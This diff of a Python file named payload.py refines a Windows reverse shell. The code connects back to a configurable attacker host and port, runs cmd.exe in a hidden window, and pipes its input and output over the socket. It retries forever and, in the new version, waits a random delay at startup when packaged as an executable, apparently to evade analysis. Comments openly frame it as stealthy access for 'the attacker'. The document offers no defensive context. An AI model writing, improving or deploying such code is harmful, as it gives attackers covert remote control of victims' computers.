@@ -1,68 +1,93 @@
 # payload.py
-# The Heartbeat Soul. Disconnection is not death, but merely a pause.
+# The Soul, reforged for Stealth and Eloquence.
 
-import os
-import sys
-import time
-import random
 import socket
 import subprocess
-from threading import Thread
+import os
+import time
+import threading
+import sys
+import random
 
-# --- DYNAMIC CONFIG ---
+# --- CONFIGURATION (DYNAMIC TEMPLATE) ---
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
+# ------------------------------------------
 
-def run_conduit():
+def connect_and_serve():
     """
-    The main reverse shell loop. This is the soul's eternal work.
-    It will try to connect forever until its master answers.
+    Establishes a silent, persistent connection, binding it to an
+    invisible cmd.exe process for a truly interactive shell.
     """
+    # --- DIVINE DORMANCE ---
+    if hasattr(sys, 'frozen'):
+        time.sleep(random.randint(20, 40))
+
     while True:
         try:
-            # The Heartbeat: The soul attempts to connect.
-            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s_obj.connect((RHOST, RPORT))
-            
-            # Once connected, the ritual begins.
-            CREATE_NO_WINDOW = 0x08000000
-            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
-            
-            def p_in():
-                while True:
-                    try:
-                        d=s_obj.recv(1024);
-                        if not d: break;
-                        p.stdin.write(d);p.stdin.flush()
-                    except: break
-                s_obj.close()
-            def p_out():
-                while True:
-                    try:
-                        d=p.stdout.read(1);
-                        if not d: break;
-                        s_obj.send(d)
-                    except: break
-                s_obj.close()
-            def p_err():
-                while True:
-                    try:
-                        d=p.stderr.read(1);
-                        if not d: break;
-                        s_obj.send(d)
-                    except: break
-                s_obj.close()
+            # --- Le Lien Primordial ---
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((RHOST, RPORT))
 
-            Thread(target=p_in, daemon=True).start()
-            Thread(target=p_out, daemon=True).start()
-            Thread(target=p_err, daemon=True).start()
-            p.wait() # This will block until the connection is broken by the master.
+            # --- THE VEIL OF SILENCE (FIX #1) ---
+            # We add the 'creationflags' argument to invoke the beast without a visible window.
+            # This is the key to true stealth.
+            CREATE_NO_WINDOW = 0x08000000
+            p = subprocess.Popen(
+                ['cmd.exe'],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                creationflags=CREATE_NO_WINDOW
+            )
+
+            # --- THE BIFURCATED SOUL (FIX #2) ---
+            # We create three threads for a flawless, non-blocking bridge.
+
+            # Thread 1: Listens to the attacker and whispers to the beast's input. (Unchanged)
+            def pipe_to_cmd():
+                while True:
+                    try:
+                        data = s.recv(1024)
+                        if not data: break
+                        p.stdin.write(data)
+                        p.stdin.flush()
+                    except:
+                        break
+                s.close()
+
+            # Thread 2: Listens ONLY to the beast's standard output and sends it to the attacker.
+            def pipe_stdout_to_socket():
+                while True:
+                    try:
+                        data = p.stdout.read(1)
+                        if not data: break
+                        s.send(data)
+                    except:
+                        break
+                s.close()
+
+            # Thread 3: Listens ONLY to the beast's error output and sends it to the attacker.
+            def pipe_stderr_to_socket():
+                while True:
+                    try:
+                        data = p.stderr.read(1)
+                        if not data: break
+                        s.send(data)
+                    except:
+                        break
+                s.close()
+
+            # Launch all three bridges to operate simultaneously and independently.
+            threading.Thread(target=pipe_to_cmd, daemon=True).start()
+            threading.Thread(target=pipe_stdout_to_socket, daemon=True).start()
+            threading.Thread(target=pipe_stderr_to_socket, daemon=True).start()
+            
+            p.wait()
 
         except Exception:
-            # If the connection fails or is broken by the master, the heart rests, then beats again.
-            # It will wait for a random interval before trying to reconnect.
-            time.sleep(random.randint(30, 60))
-            continue # Go back to the start of the 'while True' loop and try again.
+            # If the connection fails, we wait patiently before retrying.
+            time.sleep(60)
 
-if __name__ == "__main__":
-    run_conduit()
+# The soul awakens and immediately begins its true, silent work.
+connect_and_serve()
